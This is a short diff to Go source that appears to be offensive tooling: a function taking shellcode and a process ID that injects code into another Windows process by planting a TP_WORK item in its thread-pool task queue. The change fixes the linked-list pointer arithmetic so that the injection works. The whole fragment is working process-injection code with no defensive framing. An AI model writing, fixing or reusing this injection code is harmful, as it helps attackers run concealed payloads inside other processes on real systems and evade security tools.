@@ -519,8 +519,10 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	// Modify the structure to link it into target's task queue
 	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
 	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
-	tpWork.Task.ListEntry.Flink = targetTaskQueueAddr
-	tpWork.Task.ListEntry.Blink = targetTaskQueueAddr
+	// Flink and Blink should point to the Queue LIST_ENTRY field, not the TPP_QUEUE structure
+	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
+	tpWork.Task.ListEntry.Flink = targetQueueListAddr
+	tpWork.Task.ListEntry.Blink = targetQueueListAddr
 	tpWork.WorkState.Exchange = 0x2 // Mark as insertable with pending callback
 	output += "[+] Modified TP_WORK structure for insertion\n"
 
